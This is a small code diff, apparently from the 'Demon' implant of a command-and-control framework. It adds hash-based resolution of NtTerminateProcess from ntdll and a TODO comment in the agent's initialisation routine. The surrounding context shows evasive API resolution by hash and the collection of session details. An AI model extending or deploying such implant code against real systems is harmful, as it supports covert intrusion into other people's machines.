@@ -322,6 +322,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance.Win32.NtSetInformationVirtualMemory     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETINFORMATIONVIRTUALMEMORY );
         Instance.Win32.NtGetNextThread                   = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTGETNEXTTHREAD );
         Instance.Win32.NtOpenProcess                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTOPENPROCESS );
+        Instance.Win32.NtTerminateProcess                = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTTERMINATEPROCESS );
         Instance.Win32.NtQueryInformationProcess         = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONPROCESS );
         Instance.Win32.NtQuerySystemInformation          = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYSYSTEMINFORMATION );
         Instance.Win32.NtAllocateVirtualMemory           = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTALLOCATEVIRTUALMEMORY );
@@ -502,6 +503,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         }
     }
 
+    // TODO: this value changes depending on the process arch
     Instance.Session.OS_Arch   = SystemInfo.ProcessorArchitecture;
     Instance.Session.PID       = U_PTR( Instance.Teb->ClientId.UniqueProcess );
     Instance.Session.TID       = U_PTR( Instance.Teb->ClientId.UniqueThread );
